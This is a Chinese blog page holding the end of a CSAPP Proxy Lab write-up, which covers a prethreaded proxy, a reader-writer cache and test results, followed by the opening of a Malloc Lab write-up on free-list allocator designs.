<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sbuf_remove</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    P(&amp;sp-&gt;items);                          <span class="comment">/* Wait for available item */</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);                          <span class="comment">/* Lock the buffer */</span></span><br><span class="line">    item = sp-&gt;buf[(++sp-&gt;front)%(sp-&gt;n)];  <span class="comment">/* Remove the item */</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);                          <span class="comment">/* Unlock the buffer */</span></span><br><span class="line">    V(&amp;sp-&gt;slots);                          <span class="comment">/* Announce available slot */</span></span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>首先有一个对 items 的 P 操作，保证了如果没有项目，则 Proxy 被挂起，不会继续往缓冲区读出客户端</li>
<li>然后是一个 mutex 的 P 操作，保证了对缓冲区互斥的访问</li>
<li>缓冲区读出完成后，释放所有的锁，返回其中一个客户端的描述符</li>
</ul>
<h2 id="基于预线程化的-Proxy"><a href="#基于预线程化的-Proxy" class="headerlink" title="基于预线程化的 Proxy"></a>基于预线程化的 Proxy</h2><p>大部分代码与第 1 部分一样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> listenfd, connfd;</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="type">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage :%s &lt;port&gt; \n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    signal(SIGPIPE, sigpipe_handler);</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    sbuf_init(&amp;sbuf, SBUFSIZE);</span><br><span class="line">    <span class="comment">//创建工作者线程</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NTHREADS; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">        <span class="comment">//向缓冲区写入这个描述符</span></span><br><span class="line">        sbuf_insert(&amp;sbuf, connfd);</span><br><span class="line">        Getnameinfo((SA *)&amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Accepted connection from (%s %s).\n&quot;</span>, hostname, port);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是线程执行函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">thread</span><span class="params">(<span class="type">void</span> *vargp)</span></span><br><span class="line">&#123;</span><br><span class="line">    Pthread_detach(pthread_self());</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">//从缓冲区中读出描述符</span></span><br><span class="line">    <span class="type">int</span> connfd = sbuf_remove(&amp;sbuf);</span><br><span class="line">    <span class="comment">//转发</span></span><br><span class="line">    doit(connfd);</span><br><span class="line">    <span class="comment">//关闭客户端的连接描述符</span></span><br><span class="line">    Close(connfd);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="测试与结果-1"><a href="#测试与结果-1" class="headerlink" title="测试与结果"></a>测试与结果</h2><p><strong>这里有一个大坑！</strong></p>
<p>测试第 2 部分，总是有如下提示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Timeout waiting <span class="keyword">for</span> the server to grab the port reserved <span class="keyword">for</span> it</span><br></pre></td></tr></table></figure>

<p>我一直以为是我的程序有 bug，细心阅读了好多遍。后来查看他人博客，发现是<code>driver.sh</code>文件写的有问题：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413134605317.png" alt="image-20220413134605317"></p>
<p>这一部分，作者写了一个<code>nop-server.py</code>脚本模拟一个永远不会响应的服务器，来测试我们 Proxy 的并发性能。301 行这里应该改为：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413135058638.png" alt="image-20220413135058638"></p>
<p>测试结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413135405874.png" alt="image-20220413135405874"></p>
<p>15 分满分！</p>
<h1 id="Part-3-Caching-web-objects"><a href="#Part-3-Caching-web-objects" class="headerlink" title="Part 3: Caching web objects"></a>Part 3: Caching web objects</h1><p>果然是万物皆可加一层 Cache。在 Proxy 中，当多个客户端或一个客户端多次访问同一个服务端的同一对象时，Proxy 每次都要从服务端请求，这是很耗费时间的。如果 Proxy 能把访问过的对象存储下来，那么再次遇到同样的请求时，就不需要再连接到服务端了，可以直接回复给客户端。而 Cache 的大小并不是无限的，所以就又要考虑替换策略，本实验要求使用 LRU。</p>
<p>LRU 和 Cache 在 Cache Lab 中有详细的讲述。因此 Cache 的实现在这里就不再讲解了，可前往查看：</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/484657229">https://zhuanlan.zhihu.com/p/484657229</a></p>
<p>这里主要讲解一下读者-写者模型</p>
<h2 id="读者-写者模型"><a href="#读者-写者模型" class="headerlink" title="读者-写者模型"></a>读者-写者模型</h2><p>一组并发的线程要访问同一个共享对象时，将只读对象的线程叫做读者，只修改对象的进程叫做写者。写者必须拥有对对象的独占的访问，而读者可以与其它读者共享对象。该模型分为两类：</p>
<ul>
<li>读优先：要求不让读者等待</li>
<li>写优先：要求在写者之后到达的读者必须等待</li>
</ul>
<p>对于读者优先，只要有其它读者，则就应让读者先读，因此设置一个 read_cnt 记录读者数量，这个变量对于读者来说也是互斥的，所以设置一个 mutex 信号量来保护，读的过程中不允许写者写，写的过程不允许读者读，所以设置 w 来保护共享对象</p>
<p>读优先代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> read_cnt;</span><br><span class="line"><span class="type">sem_t</span> mutex, w;    <span class="comment">//都初始化为1</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reader</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        P(&amp;mutex);</span><br><span class="line">        readcnt++;</span><br><span class="line">        <span class="keyword">if</span>(readcnt==<span class="number">1</span>)</span><br><span class="line">            P(&amp;w);</span><br><span class="line">        V(&amp;mutex);</span><br><span class="line">        </span><br><span class="line">        P(&amp;mutex);</span><br><span class="line">        readcnt--;</span><br><span class="line">        <span class="keyword">if</span>(readcnt==<span class="number">0</span>)</span><br><span class="line">            V(&amp;w);</span><br><span class="line">        V(&amp;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writer</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        P(&amp;w);</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        V(&amp;w)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>只有第一个读者对 w 加锁，最后一个读者解锁。因此一旦有一个读者加锁，写者就无法访问这个共享对象了，而其它读者可以随意访问</li>
</ul>
<h2 id="Cache-结构"><a href="#Cache-结构" class="headerlink" title="Cache 结构"></a>Cache 结构</h2><p>在本实验中，对 Cache 的访问就是一个经典的读者-写者问题。有的线程要从 Cache 中读出，有的线程要写入 Cache。显然，为了 Proxy 更加高效，这里应该用读优先的模型。 </p>
<p>定义如下的 Cache 结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Cache结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> obj[MAX_OBJECT_SIZE];</span><br><span class="line">    <span class="type">char</span> uri[MAXLINE];</span><br><span class="line">    <span class="type">int</span> LRU;</span><br><span class="line">    <span class="type">int</span> isEmpty;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> read_cnt; <span class="comment">//读者数量</span></span><br><span class="line">    <span class="type">sem_t</span> w;      <span class="comment">//Cache信号量</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;  <span class="comment">//read_cnt信号量</span></span><br><span class="line"></span><br><span class="line">&#125; block;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    block data[MAX_CACHE];</span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">&#125; Cache;</span><br></pre></td></tr></table></figure>

<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>在<code>doit</code>函数中，得到一个请求后，先根据 uri 判断 Cache 中是否存在这个内容，如果存在，则直接回复；如果不存在，则连接服务器，回复结束后，把内容写进 Cache</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">doit</span><span class="params">(<span class="type">int</span> connfd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="type">char</span> server[MAXLINE];</span><br><span class="line"></span><br><span class="line">    <span class="type">rio_t</span> rio, server_rio;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cache_tag[MAXLINE];</span><br><span class="line">    Rio_readinitb(&amp;rio, connfd);</span><br><span class="line">    Rio_readlineb(&amp;rio, buf, MAXLINE);</span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);</span><br><span class="line">    <span class="built_in">strcpy</span>(cache_tag, uri);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Proxy does not implement the method&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Uri</span> *<span class="title">uri_data</span> =</span> (<span class="keyword">struct</span> Uri *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Uri));</span><br><span class="line">    <span class="comment">//判断uri是否缓存，若缓存，直接回复</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">if</span> ((i = get_Cache(cache_tag)) != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//加锁</span></span><br><span class="line">        P(&amp;cache.data[i].mutex);</span><br><span class="line">        cache.data[i].read_cnt++;</span><br><span class="line">        <span class="keyword">if</span> (cache.data[i].read_cnt == <span class="number">1</span>)</span><br><span class="line">            P(&amp;cache.data[i].w);</span><br><span class="line">        V(&amp;cache.data[i].mutex);</span><br><span class="line"></span><br><span class="line">        Rio_writen(connfd, cache.data[i].obj, <span class="built_in">strlen</span>(cache.data[i].obj));</span><br><span class="line"></span><br><span class="line">        P(&amp;cache.data[i].mutex);</span><br><span class="line">        cache.data[i].read_cnt--;</span><br><span class="line">        <span class="keyword">if</span> (cache.data[i].read_cnt == <span class="number">0</span>)</span><br><span class="line">            V(&amp;cache.data[i].w);</span><br><span class="line">        V(&amp;cache.data[i].mutex);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//解析uri</span></span><br><span class="line">    parse_uri(uri, uri_data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置header</span></span><br><span class="line">    build_header(server, uri_data, &amp;rio);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//连接服务器</span></span><br><span class="line">    <span class="type">int</span> serverfd = Open_clientfd(uri_data-&gt;host, uri_data-&gt;port);</span><br><span class="line">    <span class="keyword">if</span> (serverfd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connection failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Rio_readinitb(&amp;server_rio, serverfd);</span><br><span class="line">    Rio_writen(serverfd, server, <span class="built_in">strlen</span>(server));</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cache_buf[MAX_OBJECT_SIZE];</span><br><span class="line">    <span class="type">int</span> size_buf = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    <span class="keyword">while</span> ((n = Rio_readlineb(&amp;server_rio, buf, MAXLINE)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//注意判断是否会超出缓存大小</span></span><br><span class="line">        size_buf += n;</span><br><span class="line">        <span class="keyword">if</span>(size_buf &lt; MAX_OBJECT_SIZE)</span><br><span class="line">            <span class="built_in">strcat</span>(cache_buf, buf);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;proxy received %d bytes,then send\n&quot;</span>, (<span class="type">int</span>)n);</span><br><span class="line">        Rio_writen(connfd, buf, n);</span><br><span class="line">    &#125;</span><br><span class="line">    Close(serverfd);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(size_buf &lt; MAX_OBJECT_SIZE)&#123;</span><br><span class="line">        write_Cache(cache_tag, cache_buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>要注意，每次读写缓存时，都要加相应的锁</li>
</ul>
<p>Cache 以及 LRU 具体实现的代码，请前往我的 Cache Lab 解析查看，这里就不再讲解了。</p>
<h2 id="测试与结果-2"><a href="#测试与结果-2" class="headerlink" title="测试与结果"></a>测试与结果</h2><p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413154457448.png" alt="image-20220413154457448"></p>
<p>满分！</p>
<h1 id="FireFox-实战测试"><a href="#FireFox-实战测试" class="headerlink" title="FireFox 实战测试"></a>FireFox 实战测试</h1><p>首先打开 Proxy，监听 15213 端口</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413155537122.png" alt="image-20220413155537122"></p>
<p>配置火狐的代理设置：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413160804023.png" alt="image-20220413160804023"></p>
<p>随便打开百度试试</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413160832627.png" alt="image-20220413160832627"></p>
<p>不出意外，没有连接成功。查看一下 Proxy 打印的信息</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413155927747.png" alt="image-20220413155927747"></p>
<p>是因为请求的都不是 GET 方法</p>
<p>那就只好访问一下 TINY 服务器试试了，先打开服务器，设置端口为 15214</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413160406236.png" alt="image-20220413160406236"></p>
<p>FireFox 访问：<code>localhost: 15214</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413160538712.png" alt="image-20220413160538712"></p>
<p>访问成功了！甚至显示出了哥斯拉！</p>
<p>Proxy 打印出一些转发信息：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413160630313.png" alt="image-20220413160630313"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>我做这个实验感受非常痛苦。原因在于 CSAPP 的后三章讲得太简略了，对于我这种没有学过操作系统与计算机网络的人来说，弄懂它们是很艰难的。比如，从信号量的 P、V 操作到读者-写者模型就花费了我半天来理解</li>
<li>当然，完成实验也是成就感满满。尤其是最后打开 FireFox，连接上 TINY ，看到哥斯拉跳出来的那一刻，一种无与伦比的喜悦由内而外迸发，一切辛苦都值得了。</li>
<li>这个实验还会继续更新的，希望有一天能用它访问所有的网页</li>
<li>本实验耗时 2 天，约 16 小时</li>
</ul>
<h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>课本早已在上周就读完了，而这也是 CSAPP 的最后一个实验</p>
<p>至此，CSAPP 的学习算是告一段落了。可以说， CSAPP 是我计算机的启蒙教材，真正为我打开了计算机领域的大门，往后，我将以它为纲，往更深处学习</p>
<p>还有更深的感想与总结等有时间了再单开一篇文章写吧</p>
<p>最后，以侯捷老师的一段话结束我这三个月的冒险之旅</p>
<blockquote>
<p>作为一个好的学习者，背景不是重点，重要的是，你是否具备正确的学习态度，起步固然可以从轻松小品开始，但如果碰上大部头巨著就退避三舍、逃之夭夭，面对任何技术只求快餐速成，学语言却从来不写程序，那就绝对没有成为高手乃至专家的一天。<br>有些人学习，自练就一身钢筋铁骨，可以在热带丛林中披荆斩棘，在莽莽草原中追奔逐北。有些人的学习，既未习惯大部头书，也为习惯严谨格调，更未习惯自修勤学，是温室里的一朵花，没有自立自强的本钱。</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://deconx.top/2022/04/11/CSAPP-Lab08/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/panda.jpg">
      <meta itemprop="name" content="西门吹水">
      <meta itemprop="description" content="天行健，君子以自强不息">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="潜龙勿用">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/11/CSAPP-Lab08/" class="post-title-link" itemprop="url">CSAPP-Lab08 Malloc Lab 记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-11 11:28:24" itemprop="dateCreated datePublished" datetime="2022-04-11T11:28:24+08:00">2022-04-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-10 23:57:26" itemprop="dateModified" datetime="2022-06-10T23:57:26+08:00">2022-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSAPP-Lab/" itemprop="url" rel="index"><span itemprop="name">CSAPP Lab</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>11 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>朝闻道，夕死可矣。</p>
</blockquote>
<h1 id="实验概览"><a href="#实验概览" class="headerlink" title="实验概览"></a>实验概览</h1><p>Malloc Lab 要求用 C 语言编写一个动态存储分配器，即实现 malloc，free 和 realloc 函数。</p>
<p>性能表现主要考虑两点：</p>
<ul>
<li>空间利用率：mm_malloc 或 mm_realloc 函数分配且未被 mm_free 释放的内存与堆的大小的比值。应该找到好的策略使碎片最小化，以使该比率尽可能接近 1</li>
<li>吞吐率：每单位时间完成的最大请求数，即要使时间复杂度尽可能小</li>
</ul>
<p>分数计算公式：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220409211148431.png" alt="image-20220409211148431"></p>
<h1 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h1><p>动态内存分配器维护着一个进程的<strong>虚拟内存</strong>区域，称为堆。如图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220411080310099.png" alt="image-20220411080310099"></p>
<p>分配器将堆视为一组大小不同的块的集合来维护，且它们的地址是连续的。将块标记为两种，已分配的块供应用程序使用，空闲块用来分配</p>
<p>怎样来组织这些块呢？课本为我们提供了三种实现方式：</p>
<h2 id="Implicit-Free-List"><a href="#Implicit-Free-List" class="headerlink" title="Implicit Free List"></a>Implicit Free List</h2><p>把所有块连接起来，每次分配时从头到尾扫描合适的空闲块，我在实验的第一部分实现了这个做法</p>
<h2 id="Explicit-Free-Lists"><a href="#Explicit-Free-Lists" class="headerlink" title="Explicit Free Lists"></a>Explicit Free Lists</h2><p>它是 Implicit Free List 的进一步优化，在所有空闲块中记录两个指针，分别指向前一个空闲块和后一个空闲块，相当于在链表中又嵌套了一个链表，这样分配的时候就不需要遍历已分配块了，将分配时间从块总数的线性时间缩短为空闲块数量的线性时间</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220410103318715.png" alt="image-20220410103318715"></p>
<h2 id="Segregated-Free-Lists"><a href="#Segregated-Free-Lists" class="headerlink" title="Segregated Free Lists"></a>Segregated Free Lists</h2><p>维护多个空闲链表，每个链表中的块有大致相等的大小，分配器维护着一个空闲链表数组，每个大小类一个空闲链表，当需要分配块时只需要在对应的空闲链表中搜索就好了，书上描述了两种分离存储的方法</p>
<p><strong>Simple Segregated Storage</strong></p>
<p>从不合并与分离，每个块的大小就是大小类中最大元素的大小。例如大小类为 {17~32}，则需要分配块的大小在这个区间时均在此对应链表进行分配，并且都是分配大小为 32 的块。这样做，显然分配和释放都是常数级的，但是空间利用率较低</p>
<p><strong>Segregated Fit</strong></p>
<p>每个大小类的空闲链表包含大小不同的块，分配完一个块后，将这个块进行分割，并根据剩下的块的大小将其插入到适当大小类的空闲链表中。这个做法平衡了搜索时间与空间利用率，C 标准库提供的 GNU malloc 包就是采用的这种方法。我在实验的第二部分实现了这个做法</p>
<h1 id="Implicit-Free-List-实现"><a href="#Implicit-Free-List-实现" class="headerlink" title="Implicit Free List 实现"></a>Implicit Free List 实现</h1><p>CSAPP 详细讲述了基于隐式空闲链表，使用立即边界合并方式的实现，我们回顾一下。</p>
<p>要想分数尽可能高，我们需要使吞吐率尽可能高，空间利用率尽可能小，如果从不重复利用任何块，函数的吞吐率会非常好，而空间利用率会很差；而若进行空闲块的分割合并等操作又会影响吞吐率，因而，就要设计合适的数据结构与算法来平衡两者的关系。</p>
<ul>
<li>空闲块组织：利用隐式空闲链表记录空闲块</li>
<li>放置策略：如何选择合适的空闲块分配？<ul>
<li>首次适配：从头开始搜索空闲链表，选择第一个合适的空闲块</li>
<li>下一次适配：从上一次查询结束的地方开始搜索选择第一个合适的空闲块</li>
<li>最佳适配：搜索能放下请求大小的最小空闲块</li>
</ul>
</li>
<li>分割：在将一个新分配的块放置到某个空闲块后，剩余的部分要进行处理</li>
<li>合并：释放某个块后，要让它与相邻的空闲块合并</li>
</ul>
<p>无论用什么策略，放置的时间复杂度都为 O(n)，性能很差</p>
<h2 id="空闲块组织"><a href="#空闲块组织" class="headerlink" title="空闲块组织"></a>空闲块组织</h2><p>每个空闲块的结构如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220409212247494.png" alt="image-20220409212247494"></p>
<ul>
<li>脚部与头部是相同的，均为 4 个字节，用来存储块的大小，以及表明这个块是已分配还是空闲块</li>
